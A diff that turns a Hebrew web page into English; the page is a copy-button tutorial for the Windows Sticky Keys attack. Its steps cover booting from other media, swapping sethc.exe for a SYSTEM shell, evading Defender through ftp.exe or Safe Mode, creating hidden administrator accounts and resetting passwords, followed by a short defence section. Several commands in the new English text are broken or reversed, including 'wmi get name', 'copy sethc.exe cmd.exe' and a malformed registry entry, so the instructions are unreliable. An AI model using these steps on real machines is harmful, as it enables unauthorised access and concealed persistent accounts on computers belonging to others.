@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="he" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Sticky Keys Attack & Hiding Users Guide</title>
+  <title>Sticky Keys Attack and Hiding Users in Windows</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -51,118 +51,113 @@
 </head>
 <body>
 
-<h1>מדריך מתקפת Sticky Keys והסתרת משתמשים</h1>
+<h1>How to Perform a Sticky Keys Attack and Hide Users in Windows</h1>
 
-<h2>איך מבצעים את מתקפת Sticky Keys?</h2>
-<p>עובדים עם דיסק מערכת חלופי (כגון Windows ISO או Kali Live):</p>
+<h2>Intro</h2>
+<p>This guide explains how to use vulnerabilities in Windows to gain access to a system. The attack uses Sticky Keys or interacts directly with system files. Let’s dive in!</p>
 
-<h3>Windows ISO:</h3>
-<ol>
-<li>שנה את סדר האתחול לטעינה מה-ISO.</li>
-<li>בחר "תקן את המחשב שלך".</li>
-<li>גש ל-"פתרון בעיות" (Troubleshoot) ואז "אפשרויות מתקדמות" → "שורת פקודה" (Command Prompt).</li>
-<li>לרשימת הדיסקים:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>wmic get name</pre></li>
-<li>בחר דיסק (למשל D:), נווט ל:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>D:\Windows\System32</pre></li>
-<li>בצע גיבוי ושנה קובץ גישה (כגון sethc.exe או osk.exe):
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>copy sethc.exe sethc.bak
-copy cmd.exe sethc.exe</pre></li>
-<li>לאתחול מחדש:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>shutdown /r /f /t 0</pre></li>
-<li>לחיצה על Shift לחמש פעמים תפתח את ה-CMD בהרשאות SYSTEM.</li>
-</ol>
+<h2>Part 1: Using a Windows Boot Disk</h2>
 
-<h3>בעיה - Windows Defender חוסם את ההחלפה:</h3>
-<p>דרכים לעקיפה:</p>
+<h3>1. Change Boot Order to Load Another OS</h3>
+<p>First, boot your PC with a changed boot order. Go to the "Recovery" screen, click "Troubleshoot" > "Advanced Options" > "Command Prompt" (this is where we get started).</p>
+
+<h3>2. List All Disks</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>wmi get name</pre>
+
+<h3>3. Access Your Disk and Go to System Folder</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>D:</pre>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>cd \windows\system32</pre>
+
+<h3>4. Replace sethc.exe with cmd.exe or ftp.exe</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>copy sethc.exe cmd.exe</pre>
+
+<p><strong>Note:</strong> If Defender blocks you, try using FTP as described below.</p>
+
+<h3>5. Reboot the System</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>shutdown /r /f /t 0</pre>
+
+---
+
+<h2>Part 2: Bypassing Defender Restrictions</h2>
+
+<p>If Defender is blocking your attack, here are a few ways to bypass it:</p>
+
+<h3>1. Use ftp.exe Instead of cmd.exe</h3>
+<p>You can use the <code>!cmd</code> command to access CMD from ftp.exe.</p>
+
+<h3>2. Boot in Safe Mode</h3>
+<p>Safe Mode is a minimal boot where third-party software like Defender doesn’t run. To boot into Safe Mode:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>bcdedit /set {default} safeboot minimal</pre>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>shutdown /f /r /t 0</pre>
+
+<p>To exit Safe Mode:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>bcdedit /deletevalue {default} safeboot</pre>
+
+---
+
+<h2>Part 3: Adding Users and Escalating Privileges</h2>
+
+<h3>1. View the User List</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>net user</pre>
+
+<h3>2. Add a New User</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>net user new_username Pa$$w0rd /add</pre>
+
+<h3>3. Change a User’s Password</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>net user username Pa$$w0rd</pre>
+
+<h3>4. Add a User to the Admin Group</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>net localgroup administrators username /add</pre>
+
+<h3>5. Hide Users</h3>
+<p>To hide a user from the login screen, go to the Registry Editor and add this key:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]</pre>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>"SpecialAccounts"="hidden_user"</pre>
+
+---
+
+<h2>Part 4: Working with Kali Linux</h2>
+
+<h3>1. Change Boot Order and Load Kali</h3>
+<p>Insert your Kali USB or CD and change the boot order to load Kali Linux. Open the terminal and mount the Windows disk:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>fdisk -l</pre>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>mount /dev/sda2 /mnt</pre>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>cd /mnt/Windows/System32</pre>
+
+<h3>2. Replace sethc.exe with cmd.exe</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>cp sethc.exe cmd.exe</pre>
+
+<h3>3. Sync the Changes</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>sync</pre>
+
+<h3>4. Unmount the Disk</h3>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>umount /mnt</pre>
+
+---
+
+<h2>Part 5: Defending Against Sticky Keys Attacks</h2>
+
+<h3>How to Protect Your Computer:</h3>
+
 <ul>
-<li>להחליף במקום זאת קובץ FTP.exe ואז להיכנס ל-CMD דרך:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>!cmd</pre></li>
-<li>להיכנס למצב Safe Mode (שמנטרל את ה-Defender):
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>bcdedit /set {default} safeboot minimal</pre>
-אתחול מחדש:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>shutdown /r /f /t 0</pre>
-חזרה למצב רגיל:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>bcdedit /deletevalue {default} safeboot</pre>
-</li>
+  <li><strong>Set a BIOS Password:</strong> Add a password to your BIOS to prevent anyone from changing the boot order. <br><strong>Note:</strong> Removing the CMOS battery will reset the password, so consider other security measures.</li>
+  <li><strong>Disk Encryption:</strong> Use something like <strong>Bitlocker</strong> to encrypt your disk and prevent unauthorized access.</li>
+  <li><strong>Physical Security:</strong> Keep your computer in a secure physical location.</li>
 </ul>
 
-<h3>Kali Linux Live:</h3>
-<ol>
-<li>שנה את סדר האתחול לטעינה מ-Kali Live.</li>
-<li>פתח טרמינל.</li>
-<li>רשום:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>fdisk -l</pre></li>
-<li>הרכב את הדיסק:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>mount /dev/sda2 /mnt</pre></li>
-<li>נווט ל:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>cd /mnt/Windows/System32</pre></li>
-<li>שמור עותק ושנה קובץ:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>cp sethc.exe sethc.bak
-cp /bin/bash.exe sethc.exe</pre></li>
-<li>סנכרון וניתוק:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sync
-umount /mnt</pre></li>
-</ol>
+---
 
-<h2>איך להגן מפני מתקפת Sticky Keys?</h2>
-<ul>
-<li>הגדר סיסמת BIOS (אך הסרה של סוללת CMOS תאפס אותה).</li>
-<li>הצפן את הדיסק (למשל BitLocker).</li>
-<li>מנע גישה פיזית למחשב.</li>
-<li>Windows Defender ATP עוצר ניסיון החלפת קבצים.</li>
-</ul>
+<h2>Conclusion</h2>
+<p>In this guide, we covered how to exploit vulnerabilities in Windows to change system files and access the system using Sticky Keys and the Command Prompt. We also walked through adding users, escalating privileges, and hiding users. Lastly, we provided some tips on protecting your system from these kinds of attacks.</p>
 
-<hr>
-
-<h2>איך להסתיר משתמשים ב-Windows?</h2>
-
-<h3>להסתיר משתמש מפקודת net user:</h3>
-<p>צריך להוסיף סימן $ לשם המשתמש.</p>
-
-שינוי שם למשתמש קיים:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>wmic useraccount where name="שםמשתמש" call rename name="שםמשתמש$"</pre>
-
-<h3>להסתיר משתמש ממסך הכניסה (Winlogon):</h3>
-<p>צריך לערוך את הרג'יסטרי:</p>
-<ol>
-<li>פתח את עורך הרג'יסטרי (regedit).</li>
-<li>גש לכתובת:
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</pre></li>
-<li>אם התיקיות לא קיימות - צור אותן.</li>
-<li>צור ערך חדש מסוג DWORD (32bit), בשם שם המשתמש.</li>
-<li>קבע את הערך ל-0.</li>
-</ol>
-
-<h3>טבלת סיכום:</h3>
-<table border="1" style="border-collapse: collapse;">
-<thead>
-<tr><th>מה עשינו</th><th>איך</th></tr>
-</thead>
-<tbody>
-<tr><td>הסתרת משתמש מ-net user</td><td>הוספת $ לשם</td></tr>
-<tr><td>הסתרת משתמש ממסך התחברות</td><td>יצירת ערך ב-Registry תחת UserList</td></tr>
-</tbody>
-</table>
-
-<hr>
-
-<h2>ניהול משתמשים מתקדם:</h2>
-
-| פעולה | פקודה |
-|:---|:---|
-| צפייה בכל המשתמשים | `net user` |
-| יצירת משתמש חדש | `net user username Pa$$w0rd /add` |
-| שינוי סיסמה למשתמש | `net user username newPa$$word` |
-| הוספת משתמש לקבוצת מנהלים | `net localgroup administrators username /add` |
-| צפייה במשתמשים בקבוצה | `net localgroup groupname` |
+<p>If you want to dive deeper into more advanced topics or learn how to defend against these attacks, make sure to check out more of our guides.</p>
 
 <script>
 function copyText(button) {
   const code = button.nextSibling.textContent;
   navigator.clipboard.writeText(code.trim());
-  button.innerText = "הועתק!";
-  setTimeout(() => button.innerText = "העתק", 2000);
+  button.innerText = "Copied!";
+  setTimeout(() => button.innerText = "Copy", 2000);
 }
 </script>
 
